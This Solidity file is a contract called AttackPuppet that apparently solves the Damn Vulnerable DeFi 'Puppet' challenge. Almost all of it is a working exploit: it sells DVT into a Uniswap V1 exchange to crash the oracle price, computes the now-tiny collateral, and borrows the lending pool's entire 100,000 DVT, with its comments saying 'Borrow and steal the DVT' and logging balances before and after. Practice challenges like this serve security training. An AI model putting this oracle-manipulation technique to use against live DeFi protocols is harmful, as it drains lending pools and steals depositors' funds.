// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}
interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}
 
contract AttackPuppet {

    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
    uint256 constant DEPOSIT_FACTOR = 2;
    uint256 constant BORROW_DVT_AMOUNT = 100000 ether;
    
    IUniswapExchangeV1 immutable exchange;
    IERC20 immutable token;
    IPool immutable pool;
    address immutable player;

    constructor(address _token, address _pair, address _pool){
        token = IERC20(_token);
        exchange = IUniswapExchangeV1(_pair);
        pool = IPool(_pool);
        player = msg.sender;
    }

    function attack() external payable {  // 11 ethers & 1000 dvt tokens are send
        require(msg.sender == player);
 
        console.log("contract ETH balance before tokenToEthTransferInput: ", address(this).balance); 
        // 11.000000000000000000
        console.log("player ETH balance before tokenToEthTransferInput: ", msg.sender.balance); 
        // 9988.964656422864462410
        // here msg.sender is player-2, his initial balance is 1000 ethers(given by hardhat)
        console.log("DVT token balance: ", token.balanceOf(msg.sender));  // 0
        console.log("DVT tokens balance of contract : ",token.balanceOf(address(this))); // 1000.000000000000000000

        // Dump DVT to the Uniswap Pool
        token.approve(address(exchange), SELL_DVT_AMOUNT);
        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 1, block.timestamp, address(this));

        // Calculate required collateral
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        console.log("contract ETH balance: ", address(this).balance);// 20.900695134061569016
        console.log("DVT price: ", price); // 98321649443991
        console.log("Deposit Required: ", depositRequired);  // 19664329888798200000
        console.log("DVT tokens balance of palyer : ",token.balanceOf(msg.sender));  // 0
        console.log("DVT tokens balance of contract : ",token.balanceOf(address(this))); // 0
        console.log("DVT tokens balance of exchange : ",token.balanceOf(address(exchange)));  
        // 1010.000000000000000000
        console.log("Eth balance of exchange contract :",address(exchange).balance); // 0.99304865938430984

        // Borrow and steal the DVT
        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);

        console.log("contract ETH balance after borrow: ", address(this).balance);  // 12.36365245263369016
        console.log("DVT price after borrow: ", price);  // 98321649443991
        console.log("Deposit Required after borrow: ", depositRequired); // 19664329888798200000
        console.log("DVT tokens balance of palyer : ",token.balanceOf(msg.sender)); // 100000000000000000000000
        console.log("DVT tokens balance of contract : ",token.balanceOf(address(this)));  // 0
        console.log("DVT tokens balance of exchange : ",token.balanceOf(address(exchange)));  // 1010000000000000000000
        console.log("Eth balance of exchange contract :",address(exchange).balance);  // 99304865938430984
    }

    receive() external payable {}
}